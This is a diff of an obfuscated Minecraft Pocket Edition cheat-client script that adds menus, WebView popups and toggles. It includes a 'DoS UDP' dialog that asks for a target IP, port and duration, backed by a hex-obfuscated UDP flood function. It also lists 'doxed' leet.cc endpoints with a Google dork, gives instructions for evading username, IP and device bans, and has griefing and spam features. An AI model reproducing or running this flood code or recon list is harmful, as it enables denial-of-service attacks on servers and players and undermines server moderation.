- alert.setMessage("These are LEET.cc doxed sites connecting to leet, i found by doxing, searching in index, in files, in sites etc... use at your own risk if you know how to use.\nhttps://leet.cc/serverNew.php\nhttps://leet.cc\nhttps://leet.cc/#plugins\nhttps://leet.cc/pluginLoaderAPI.php\nhttps://leet.cc/featuredServers.php\nhttps://leet.cc/paypalPayment.php\nhttps://leet.cc/verifyServerDomain.php\nhttps://leet.cc/verifyServer.php\nhttps://leet.cc/verifyUser.php\nhttps://leet.cc/news\nhttps://leet.cc/robots.txt\nhttps://leet.cc/media\nhttps://leet.cc/styles\nhttps://leet.cc/js\nhttps://leet.cc/login.php\nhttps://leet.cc/buyCreditsNew.php\nhttps://forum.leet.cc\nhttps://hosting.leet.cc\nhttps://hosting2.leet.cc\nhttps://leethost.io\nhttps://mcpe.leet.cc\nhttps://mcpc.leet.cc\nhttps://leet.cc/uploadImage.php\nhttp://srgblock4051.leet.cc\nhttp://leet.cc/mcpc/maps\nhttp://forum.leet.cc/sitemap.xml\nhttps://leet.cc/actionNew.php?\nhttps://www.google.com/search?q=site:leet.cc+ext:doc+%7C+ext:docx+%7C+ext:odt+%7C+ext:pdf+%7C+ext:rtf+%7C+ext:sxw+%7C+ext:psw+%7C+ext:ppt+%7C+ext:pptx+%7C+ext:pps+%7C+ext:csv");
+ alert.setMessage("These are LEET.cc doxed sites connecting to leet, i found by doxing, searching in index, in files, in sites etc... use at your own risk if you know how to use.\nhttps://leet.cc/serverNew.php\nhttps://leet.cc\nhttps://leet.cc/#plugins\nhttps://leet.cc/pluginLoaderAPI.php\nhttps://leet.cc/featuredServers.php\nhttps://leet.cc/paypalPayment.php\nhttps://leet.cc/verifyServerDomain.php\nhttps://leet.cc/verifyServer.php\nhttps://leet.cc/verifyUser.php\nhttps://leet.cc/news\nhttps://leet.cc/robots.txt\nhttps://leet.cc/media\nhttps://leet.cc/styles\nhttps://leet.cc/js\nhttps://leet.cc/login.php\nhttps://leet.cc/buyCreditsNew.php\nhttps://forum.leet.cc\nhttps://hosting.leet.cc\nhttps://hosting2.leet.cc\nhttps://leethost.io\nhttps://mcpe.leet.cc\nhttps://mcpc.leet.cc\nhttps://leet.cc/uploadImage.php\nhttp://srgblock4051.leet.cc\nhttp://leet.cc/mcpc/maps\nhttp://forum.leet.cc/sitemap.xml\nhttps://leet.cc/actionNew.php\nhttps://www.google.com/search?q=site:leet.cc+ext:doc+%7C+ext:docx+%7C+ext:odt+%7C+ext:pdf+%7C+ext:rtf+%7C+ext:sxw+%7C+ext:psw+%7C+ext:ppt+%7C+ext:pptx+%7C+ext:pps+%7C+ext:csv");
 
 alert.setPositiveButton("Exit all", new android.content.DialogInterface.OnClickListener(){ 
   onClick: function(viewarg){
@@ -892,6 +1214,59 @@ print("The LEET Dialog Is Malfunctioning:"+e);
 }
 
 var _0xc281=["\x77\x65\x62\x6B\x69\x74","\x67\x65\x74\x53\x65\x74\x74\x69\x6E\x67\x73","\x73\x65\x74\x4A\x61\x76\x61\x53\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x73\x65\x74\x57\x65\x62\x43\x68\x72\x6F\x6D\x65\x43\x6C\x69\x65\x6E\x74","\x73\x65\x74\x57\x65\x62\x56\x69\x65\x77\x43\x6C\x69\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x6C\x65\x65\x74\x2E\x63\x63\x2F\x76\x65\x72\x69\x66\x79\x53\x65\x72\x76\x65\x72\x44\x6F\x6D\x61\x69\x6E\x2E\x70\x68\x70\x3F\x76\x65\x72\x73\x69\x6F\x6E\x43\x6F\x64\x65\x3D\x31\x34\x26\x64\x6F\x6D\x61\x69\x6E\x3D","\x6C\x6F\x61\x64\x55\x72\x6C","\x73\x68\x6F\x77","\x73\x65\x74\x56\x69\x65\x77","\x41\x6C\x65\x72\x74\x44\x69\x61\x6C\x6F\x67","\x61\x70\x70","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64"];function pee3(){ctx[_0xc281[12]]( new java[_0xc281[11]].Runnable({run:function(){var _0x1ac1x2= new android[_0xc281[0]].WebView(ctx);var _0x1ac1x3=_0x1ac1x2[_0xc281[1]]();_0x1ac1x3[_0xc281[2]](true);_0x1ac1x2[_0xc281[3]]( new android[_0xc281[0]].WebChromeClient());_0x1ac1x2[_0xc281[4]]( new android[_0xc281[0]].WebViewClient());_0x1ac1x2[_0xc281[6]](_0xc281[5]+ip); new android[_0xc281[10]][_0xc281[9]].Builder(ctx)[_0xc281[8]](_0x1ac1x2)[_0xc281[7]]()}}))}
+
+var leet5 = new android.widget.Button(ctx);
+            leet5.setText("LEET.cc donate List");
+            leet5.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+cmenu.dismiss();
+don();
+                }
+            }));
+            cmenuLayout.addView(leet5);
+
+function don() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+don = new android.widget.PopupWindow();
+var Layer3 = new android.widget.LinearLayout(ctx);
+var IDm = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter to view donations");
+Dialog.setContentView(Layer3);
+
+Layer3.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer3.addView(IDm);
+Layer3.addView(Exit);
+
+IDm.setText("");
+IDm.setHint("Support ID");
+Exit.setText("view list");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+gd =IDm.getText();
+Dialog.dismiss();
+donList();
+print("Loading web page");
+showMenuBtn();
+}
+});
+
+don.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+don.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+don.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The LEET Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+var _0x28f6=["\x77\x65\x62\x6B\x69\x74","\x67\x65\x74\x53\x65\x74\x74\x69\x6E\x67\x73","\x73\x65\x74\x4A\x61\x76\x61\x53\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x73\x65\x74\x57\x65\x62\x43\x68\x72\x6F\x6D\x65\x43\x6C\x69\x65\x6E\x74","\x73\x65\x74\x57\x65\x62\x56\x69\x65\x77\x43\x6C\x69\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x6C\x65\x65\x74\x2E\x63\x63\x2F\x67\x65\x74\x44\x6F\x6E\x61\x74\x69\x6F\x6E\x73\x2E\x70\x68\x70\x3F\x73\x65\x72\x76\x65\x72\x49\x44\x3D","\x6C\x6F\x61\x64\x55\x72\x6C","\x73\x68\x6F\x77","\x73\x65\x74\x56\x69\x65\x77","\x41\x6C\x65\x72\x74\x44\x69\x61\x6C\x6F\x67","\x61\x70\x70","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64"];function donList(){ctx[_0x28f6[12]]( new java[_0x28f6[11]].Runnable({run:function(){var _0xc511x2= new android[_0x28f6[0]].WebView(ctx);var _0xc511x3=_0xc511x2[_0x28f6[1]]();_0xc511x3[_0x28f6[2]](true);_0xc511x2[_0x28f6[3]]( new android[_0x28f6[0]].WebChromeClient());_0xc511x2[_0x28f6[4]]( new android[_0x28f6[0]].WebViewClient());_0xc511x2[_0x28f6[6]](_0x28f6[5]+gd); new android[_0x28f6[10]][_0x28f6[9]].Builder(ctx)[_0x28f6[8]](_0xc511x2)[_0x28f6[7]]()}}))}
 
 var leet2 = new android.widget.Button(ctx);
             leet2.setText("LEET.cc Donate");
@@ -1009,6 +1384,71 @@ print("The LEET Dialog Is Malfunctioning:"+e);
 
       var _0x9c2d=["\x77\x65\x62\x6B\x69\x74","\x67\x65\x74\x53\x65\x74\x74\x69\x6E\x67\x73","\x73\x65\x74\x4A\x61\x76\x61\x53\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x73\x65\x74\x57\x65\x62\x43\x68\x72\x6F\x6D\x65\x43\x6C\x69\x65\x6E\x74","\x73\x65\x74\x57\x65\x62\x56\x69\x65\x77\x43\x6C\x69\x65\x6E\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6C\x65\x65\x74\x2E\x63\x63\x2F\x73\x65\x72\x76\x65\x72\x4E\x65\x77\x2E\x70\x68\x70\x3F\x73\x65\x72\x76\x65\x72\x49\x44\x3D","\x6C\x6F\x61\x64\x55\x72\x6C","\x73\x68\x6F\x77","\x73\x65\x74\x56\x69\x65\x77","\x41\x6C\x65\x72\x74\x44\x69\x61\x6C\x6F\x67","\x61\x70\x70","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64"];function pee(){ctx[_0x9c2d[12]]( new java[_0x9c2d[11]].Runnable({run:function(){var _0x369dx2= new android[_0x9c2d[0]].WebView(ctx);var _0x369dx3=_0x369dx2[_0x9c2d[1]]();_0x369dx3[_0x9c2d[2]](true);_0x369dx2[_0x9c2d[3]]( new android[_0x9c2d[0]].WebChromeClient());_0x369dx2[_0x9c2d[4]]( new android[_0x9c2d[0]].WebViewClient());_0x369dx2[_0x9c2d[6]](_0x9c2d[5]+end); new android[_0x9c2d[10]][_0x9c2d[9]].Builder(ctx)[_0x9c2d[8]](_0x369dx2)[_0x9c2d[7]]()}}))}
 
+var leet4 = new android.widget.Button(ctx);
+            leet4.setText("LEET.cc app news");
+            leet4.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+cmenu.dismiss();
+getNews();
+                }
+            }));
+            cmenuLayout.addView(leet4);
+
+function getNews() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+getNews = new android.widget.PopupWindow();
+var Layer3 = new android.widget.LinearLayout(ctx);
+var IDD = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter to view news");
+Dialog.setContentView(Layer3);
+
+Layer3.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer3.addView(IDD);
+Layer3.addView(Exit);
+
+IDD.setText("");
+IDD.setHint("Support ID");
+Exit.setText("get news");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+nw =IDD.getText();
+Dialog.dismiss();
+pe();
+print("Loading web page");
+showMenuBtn();
+}
+});
+
+getNews.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+getNews.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+getNews.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The LEET Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function pe()
+      {
+      ctx.runOnUiThread(new java.lang.Runnable({run: function(){
+      var webs = new android.webkit.WebView(ctx);
+      var webset = webs.getSettings();
+      webset.setJavaScriptEnabled(true);
+      webs.setWebChromeClient(new android.webkit.WebChromeClient());
+      webs.setWebViewClient(new android.webkit.WebViewClient());
+      webs.loadUrl('http://leet.cc/newsNew.php?serverID=' + nw);
+/*Site URL*/
+      new android.app.AlertDialog.Builder(ctx).setView(webs).show();
+      }}));
+      }
+
 var dd1 = new android.widget.Button(ctx);
            dd1.setText("DoS UDP");
            dd1.setOnClickListener(new android.view.View.OnClickListener({
@@ -1047,7 +1487,7 @@ k1.setHint("IP");
 k2.setText("");
 k2.setHint("Port");
 k3.setText("");
-k3.setHint("Number of packets");
+k3.setHint("Time of attack (1 sec = 800-1,000 packet)");
 Exit.setText("Attack");
 
 Exit.setOnClickListener(new android.view.View.OnClickListener(){
@@ -1056,6 +1496,7 @@ ip =k1.getText();
 port =k2.getText();
 howmuch =k3.getText();
 Dialog.dismiss();
+//ddos();
 clientMessage(client + "§7Not working");
 print("No longer working.");
 showMenuBtn();
@@ -1071,7 +1512,7 @@ print("The DoS UDP Dialog Is Malfunctioning:"+e);
 }});
 }
 
-var _0x56f5=["\x6E\x65\x74","\x55\x54\x46\x38","\x67\x65\x74\x42\x79\x74\x65\x73","","\x6C\x65\x6E\x67\x74\x68","\x67\x65\x74\x42\x79\x4E\x61\x6D\x65","\x49\x6E\x65\x74\x41\x64\x64\x72\x65\x73\x73","\x73\x65\x6E\x64","\x63\x6C\x6F\x73\x65","\x6C\x61\x6E\x67","\x73\x74\x61\x72\x74"];function ddos(_0xb446x2,_0xb446x3,_0xb446x4){var _0xb446x5= new java[_0x56f5[9]].Runnable({run:function(){try{for(var _0xb446x6=0;_0xb446x6<=_0xb446x4;_0xb446x6++){var _0xb446x7= new java[_0x56f5[0]].DatagramSocket();var _0xb446x8= new byte[2024];_0xb446x8=_0x56f5[3].toString()[_0x56f5[2]](_0x56f5[1]);_0xb446x7[_0x56f5[7]]( new java[_0x56f5[0]].DatagramPacket(_0xb446x8,_0xb446x8[_0x56f5[4]],java[_0x56f5[0]][_0x56f5[6]][_0x56f5[5]](_0xb446x2),_0xb446x3));_0xb446x7[_0x56f5[8]]()}}catch(e){print(e)}}});var _0xb446x9= new java[_0x56f5[9]].Thread(_0xb446x5);_0xb446x9[_0x56f5[10]]()}
+var _0x56f5=["\x6E\x65\x74","\x55\x54\x46\x38","\x67\x65\x74\x42\x79\x74\x65\x73","","\x6C\x65\x6E\x67\x74\x68","\x67\x65\x74\x42\x79\x4E\x61\x6D\x65","\x49\x6E\x65\x74\x41\x64\x64\x72\x65\x73\x73","\x73\x65\x6E\x64","\x63\x6C\x6F\x73\x65","\x6C\x61\x6E\x67","\x73\x74\x61\x72\x74"];function ddosss(_0xb446x2,_0xb446x3,_0xb446x4){var _0xb446x5= new java[_0x56f5[9]].Runnable({run:function(){try{for(var _0xb446x6=0;_0xb446x6<=_0xb446x4;_0xb446x6++){var _0xb446x7= new java[_0x56f5[0]].DatagramSocket();var _0xb446x8= new byte[2024];_0xb446x8=_0x56f5[3].toString()[_0x56f5[2]](_0x56f5[1]);_0xb446x7[_0x56f5[7]]( new java[_0x56f5[0]].DatagramPacket(_0xb446x8,_0xb446x8[_0x56f5[4]],java[_0x56f5[0]][_0x56f5[6]][_0x56f5[5]](_0xb446x2),_0xb446x3));_0xb446x7[_0x56f5[8]]()}}catch(e){print(e)}}});var _0xb446x9= new java[_0x56f5[9]].Thread(_0xb446x5);_0xb446x9[_0x56f5[10]]()}
 
 var svr = new android.widget.Button(ctx);
             svr.setText("Server IP & Port");
@@ -1157,6 +1598,102 @@ print("The IPLU Dialog Is Malfunctioning:"+e);
       new android.app.AlertDialog.Builder(ctx).setView(webs).show();
       }}));
       }
+
+var ht1 = new android.widget.Button(ctx);
+		ht1.setText("How to bypass ban");
+		ht1.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){
+var alert = new android.app.AlertDialog.Builder(ctx); 
+/*alert.setTitle("Alphα Hαck" + space + version + space + "changelog"); */
+
+var scroll = new android.widget.ScrollView(ctx); 
+var layout = new android.widget.LinearLayout(ctx); 
+layout.setOrientation(1);
+
+alert.setTitle("How to bypass a /ban");
+ alert.setMessage("Sometimes when you do dumb shit on servers you get banned,\nYou can get out of a ban in 3 ways...\n#1 admin unbans you.\n#2Change your username.\n#3Server resets.\nWhen an OP uses /ban on you it bans your username in the server and puts your username in a type of saving system that doesn't allow you to join, /ban is a common command in Minecraft. most server cores use /ban.\n-Arceus_matt");
+
+alert.setPositiveButton("Exit all", new android.content.DialogInterface.OnClickListener(){ 
+  onClick: function(viewarg){
+    
+dialog.dismiss();
+cmenu.dismiss();
+      }});
+
+alert.setNegativeButton("Back to menu", new android.content.DialogInterface.OnClickListener(){ 
+   onClick: function(viewarg){
+
+dialog.dismiss();
+      }});
+var dialog = alert.create();
+dialog.show();
+			}
+		});
+		cmenuLayout.addView(ht1);
+
+var ht2 = new android.widget.Button(ctx);
+		ht2.setText("How to bypass ip ban");
+		ht2.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){
+var alert = new android.app.AlertDialog.Builder(ctx); 
+/*alert.setTitle("Alphα Hαck" + space + version + space + "changelog"); */
+
+var scroll = new android.widget.ScrollView(ctx); 
+var layout = new android.widget.LinearLayout(ctx); 
+layout.setOrientation(1);
+
+alert.setTitle("How to bypass a /ban-ip");
+ alert.setMessage("Sometimes when you do dumb shit on servers you get ip banned,\nYou can get out of a ban in 3 ways.\n#1 get Unbanned\n#2 server resets\n#3 Use a VPN Client to change your external ip address\nWhen an OP uses /ban-ip on you it bans your wifi external ip address in the server and puts your ip in a type of saving system that doesn't allow you to join or view server online, /ban-ip is a common command in Minecraft. most server cores use /ban-ip.\n-Arceus_matt");
+
+alert.setPositiveButton("Exit all", new android.content.DialogInterface.OnClickListener(){ 
+  onClick: function(viewarg){
+    
+dialog.dismiss();
+cmenu.dismiss();
+      }});
+
+alert.setNegativeButton("Back to menu", new android.content.DialogInterface.OnClickListener(){ 
+   onClick: function(viewarg){
+
+dialog.dismiss();
+      }});
+var dialog = alert.create();
+dialog.show();
+			}
+		});
+		cmenuLayout.addView(ht2);
+
+var ht3 = new android.widget.Button(ctx);
+		ht3.setText("How to bypass devban");
+		ht3.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){
+var alert = new android.app.AlertDialog.Builder(ctx); 
+/*alert.setTitle("Alphα Hαck" + space + version + space + "changelog"); */
+
+var scroll = new android.widget.ScrollView(ctx); 
+var layout = new android.widget.LinearLayout(ctx); 
+layout.setOrientation(1);
+
+alert.setTitle("How to bypass a /devban");
+ alert.setMessage("Sometimes when you do dumb shit on servers you get dev banned,\nYou can get out of a ban in 3 ways.\n#1 get Unbanned\n#2 server resets\n#3 Go in your file storage and go to Games > com.mojang > minecraftpe > clientId.txt and change the id to any number\nWhen an OP uses /devban on you it bans your device(MCPE Client ID) in the server and puts your ID in a type of saving system that doesn't allow you to join, /devban is a command the server has if they download a plugin\n-Arceus_matt");
+
+alert.setPositiveButton("Exit all", new android.content.DialogInterface.OnClickListener(){ 
+  onClick: function(viewarg){
+    
+dialog.dismiss();
+cmenu.dismiss();
+      }});
+
+alert.setNegativeButton("Back to menu", new android.content.DialogInterface.OnClickListener(){ 
+   onClick: function(viewarg){
+
+dialog.dismiss();
+      }});
+var dialog = alert.create();
+dialog.show();
+			}
+		});
+		cmenuLayout.addView(ht3);
 
 var opp = new Button(ctx);
             opp.setText("OP permission.");        
@@ -1294,7 +1831,7 @@ Exit.setOnClickListener(new android.view.View.OnClickListener(){
 onClick: function(view){
 wb3 =wb2.getText();
 Dialog.dismiss();
-wb4();
+wb9();
 print("Loading web page");
 showMenuBtn();
 }
@@ -1309,7 +1846,7 @@ print("The wb Dialog Is Malfunctioning:"+e);
 }});
 }
 
-      function wb4()
+      function wb9()
       {
       ctx.runOnUiThread(new java.lang.Runnable({run: function(){
       var webs = new android.webkit.WebView(ctx);
@@ -1429,8 +1966,8 @@ var dw = new android.widget.Button(ctx);
 		dw.setText("Dark web browser");
 		dw.setOnClickListener(new android.view.View.OnClickListener() {
 			onClick: function(v){
-print("This is not for kids!");
-clientMessage("This is private and not for children.");
+print("this is private");
+clientMessage("this is private");
 			}
 		});
 		cmenuLayout.addView(dw);
@@ -1587,7 +2124,7 @@ var ray = new android.widget.Button(ctx);
 			onClick: function(v){         xxray?xxray=false:xxray=true;
 ray.setText("X-ray: "+(xxray?"on":"off"));
 if(xxray == true){
-clientMessage(client + "§7If you want a better X-ray download godsoft029's client!" + "\n" + "https://github.com/Godsoft029/servicehack");
+clientMessage(client + "§7If you want a better X-ray download godsoft029's mod!" + "\n" + "https://github.com/Godsoft029/servicehack");
 Block.setRenderLayer(1,1);
 
 Block.setRenderLayer(2,1);
@@ -1626,7 +2163,7 @@ var ww = new android.widget.Button(ctx);
 			onClick: function(v){         waterwalk?waterwalk=false:waterwalk=true;
 ww.setText("Water Walk: "+(waterwalk?"on":"off"));
 if(waterwalk == true){
-clientMessage(client + "§7If you want a better water walk download godsoft029's client!" + "\n" + "https://github.com/Godsoft029/servicehack");
+clientMessage(client + "§7If you want a better water walk download godsoft029's mod!" + "\n" + "https://github.com/Godsoft029/servicehack");
 
 //Made by godsoft029 don't steal
 
@@ -1700,6 +2237,46 @@ clientMessage(client + "§7Your gamemode was updated to survival mode!");
                 }
             }));
             zmenuLayout.addView(survival);
+
+var ad = new android.widget.Button(ctx);
+      ad.setText("Auto destroy: "+(autod?"on":"off"));
+		ad.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){         autod?autod=false:autod=true;
+ad.setText("Auto destroy: "+(autod?"on":"off"));
+if(autod == true){
+clientMessage(client + "§7Automatic block destroy on, by johnmacro");
+
+autod = true;
+}
+if(autod == false){
+clientMessage(client + "§7Automatic block destroy off, by johnmacro");
+
+autod = false;
+                }
+			}
+		});
+		zmenuLayout.addView(ad);
+
+var df = new android.widget.Button(ctx);
+      df.setText("Disable up/down fly: "+(nofly?"on":"off"));
+		df.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){         nofly?nofly=false:nofly=true;
+df.setText("Disable up/down fly: "+(nofly?"on":"off"));
+if(nofly == true){
+clientMessage(client + "§7No up/down fly is on");
+Player.setCanFly(false);
+
+nofly = true;
+}
+if(nofly == false){
+clientMessage(client + "§7No up/down fly is off");
+Player.setCanFly(true);
+
+nofly = false;
+                }
+			}
+		});
+		zmenuLayout.addView(df);
 
 var es = new Button(ctx);
             es.setText("Entity spawner");        
@@ -1826,6 +2403,51 @@ print(errr);
 }
 }}));
 }
+
+var cc = new Button(ctx);
+            cc.setText("Clear your chat");        
+            cc.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+
+                    clientMessage(" " + "\n ");
+
+clientMessage(" " + "\n" + " ");
+
+clientMessage(" " + "\n" + " ");
+
+clientMessage(" " + "\n" + " ");
+
+clientMessage(" " + "\n" + " ");
+
+clientMessage(" " + "\n" + " ");
+
+clientMessage(" " + "\n" + " ");
+
+clientMessage(" " + "\n" + " ");
+                }
+            }));
+            zmenuLayout.addView(cc);
+
+var spam2 = new android.widget.Button(ctx);
+           spam2.setText("Tap spammer: "+(tspam?"on":"off"));
+            spam2.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+tspam?tspam=false:tspam=true;
+spam2.setText("Tap spammer: "+(tspam?"on":"off"));
+if(tspam == true){
+clientMessage(client + "§7Tap spam is on, tap ground");
+spa(); 
+
+tspam = true
+}
+if(tspam == false){
+clientMessage(client + "§7Tap spam is off");
+
+tspam = false
+                }
+}
+            }));
+            zmenuLayout.addView(spam2);
 
 var mf = new Button(ctx);
             mf.setText("Make food item");
@@ -2045,26 +2667,6 @@ Player.setCanFly(0);
 }
             }));
             zmenuLayout.addView(f);
-
-var p = new android.widget.Button(ctx);
-            p.setText("Fun particle: "+(parti?"on":"off"));
-            p.setOnClickListener(new android.view.View.OnClickListener({
-                onClick: function(viewarg){
-parti?parti=false:parti=true;
-p.setText("Fun particle: "+(parti?"on":"off"));
-if(parti == true){
-clientMessage("§o§cE§bn§aj§eo§dy §1f§2u§3n §4p§5a§6r§7t§8i§9c§0l§fe§l!");
-parti2 = true;
-parti = true;
-}
-if(parti == false){
-clientMessage(client + "§7Fun particles off");
-parti2 = false;
-parti = false;
-                }
-}
-            }));
-            zmenuLayout.addView(p);
 
 var g = new android.widget.Button(ctx);
             g.setText("Grief run: "+(grief?"on":"off"));
@@ -6727,6 +7329,542 @@ Level.setLightningLevel(v2);
 
 /***********************/
 
+var btn14 = new android.widget.Button(ctx);
+		btn14.setText("Particle Menu");
+if(GetLang=="de_DE")btn14.setText('Partikel Menü');
+if(GetLang=="ko_KR")btn14.setText('파티클 메뉴');
+
+if(GetLang=="es_MX")btn14.setText('Menú de Partícula');
+btn14.setTextColor(GUIBtns);
+		btn14.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){
+             pmenu_menu();
+             menu.dismiss();
+			}
+		});
+		menuLayout.addView(btn14);
+
+/***********************/
+
+function pmenu_menu(){
+ctx.runOnUiThread(new Runnable({ run: function(){
+        try{
+            var pmenuLayout = new LinearLayout(ctx);
+            var pmenuScroll = new ScrollView(ctx);
+            var pmenuLayout1 = new LinearLayout(ctx);
+            pmenuLayout.setOrientation(1);
+            pmenuLayout1.setOrientation(1);
+            pmenuScroll.addView(pmenuLayout);
+            pmenuLayout1.addView(pmenuScroll);
+
+var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
+		MainTitle.setText("Alphα Hαck" + space + version);
+       MainTitle.setTextColor(GUIName);
+		MainTitle.setTextSize(20);
+		pmenuLayout.addView(MainTitle);
+            
+            var P_title = new android.widget.TextView(ctx); P_title.setGravity(android.view.Gravity.CENTER);
+		P_title.setText("Particle Menu");
+       P_title.setTextColor(GUIName);
+		P_title.setTextSize(20);
+		pmenuLayout.addView(P_title);
+
+var A_exit = new android.widget.Button(ctx);
+		A_exit.setText("Exit");
+		A_exit.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){
+             pmenu.dismiss();
+showMenuBtn();
+			}
+		});
+		pmenuLayout.addView(A_exit);
+
+var p1 = new android.widget.Button(ctx);
+            p1.setText("Angry villager: "+(particle1?"on":"off"));
+            p1.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle1?particle1=false:particle1=true;
+p1.setText("Angry villager: "+(particle1?"on":"off"));
+if(particle1 == true){
+clientMessage(client + "§7Particle 1 is true");
+}
+if(particle1 == false){
+clientMessage(client + "§7Particle 1 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p1);
+
+var p2 = new android.widget.Button(ctx);
+            p2.setText("bubble: "+(particle2?"on":"off"));
+            p2.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle2?particle2=false:particle2=true;
+p2.setText("bubble: "+(particle2?"on":"off"));
+if(particle2 == true){
+clientMessage(client + "§7Particle 2 is true");
+}
+if(particle2 == false){
+clientMessage(client + "§7Particle 2 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p2);
+
+var p3 = new android.widget.Button(ctx);
+            p3.setText("cloud: "+(particle3?"on":"off"));
+            p3.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle3?particle3=false:particle3=true;
+p3.setText("cloud: "+(particle3?"on":"off"));
+if(particle3 == true){
+clientMessage(client + "§7Particle 3 is true");
+}
+if(particle3 == false){
+clientMessage(client + "§7Particle 3 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p3);
+
+var p4 = new android.widget.Button(ctx);
+            p4.setText("crit: "+(particle4?"on":"off"));
+            p4.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle4?particle4=false:particle4=true;
+p4.setText("crit: "+(particle4?"on":"off"));
+if(particle4 == true){
+clientMessage(client + "§7Particle 4 is true");
+}
+if(particle4 == false){
+clientMessage(client + "§7Particle 4 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p4);
+
+var p5 = new android.widget.Button(ctx);
+            p5.setText("drip lava: "+(particle5?"on":"off"));
+            p5.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle5?particle5=false:particle5=true;
+p5.setText("drip lava: "+(particle5?"on":"off"));
+if(particle5 == true){
+clientMessage(client + "§7Particle 5 is true");
+}
+if(particle5 == false){
+clientMessage(client + "§7Particle 5 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p5);
+
+var p6 = new android.widget.Button(ctx);
+            p6.setText("drip water: "+(particle6?"on":"off"));
+            p6.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle6?particle6=false:particle6=true;
+p6.setText("drip water: "+(particle6?"on":"off"));
+if(particle6 == true){
+clientMessage(client + "§7Particle 6 is true");
+}
+if(particle6 == false){
+clientMessage(client + "§7Particle 6 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p6);
+
+var p7 = new android.widget.Button(ctx);
+            p7.setText("enchanting table: "+(particle7?"on":"off"));
+            p7.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle7?particle7=false:particle7=true;
+p7.setText("enchanting table: "+(particle7?"on":"off"));
+if(particle7 == true){
+clientMessage(client + "§7Particle 7 is true");
+}
+if(particle7 == false){
+clientMessage(client + "§7Particle 7 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p7);
+
+var p8 = new android.widget.Button(ctx);
+            p8.setText("falling dust: "+(particle8?"on":"off"));
+            p8.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle8?particle8=false:particle8=true;
+p8.setText("falling dust: "+(particle8?"on":"off"));
+if(particle8 == true){
+clientMessage(client + "§7Particle 8 is true");
+}
+if(particle8 == false){
+clientMessage(client + "§7Particle 8 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p8);
+
+var p9 = new android.widget.Button(ctx);
+            p9.setText("flame: "+(particle9?"on":"off"));
+            p9.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle9?particle9=false:particle9=true;
+p9.setText("flame: "+(particle9?"on":"off"));
+if(particle9 == true){
+clientMessage(client + "§7Particle 9 is true");
+}
+if(particle9 == false){
+clientMessage(client + "§7Particle 9 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p9);
+
+var p10 = new android.widget.Button(ctx);
+            p10.setText("Happy villager: "+(particle10?"on":"off"));
+            p10.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle10?particle10=false:particle10=true;
+p10.setText("Happy villager: "+(particle10?"on":"off"));
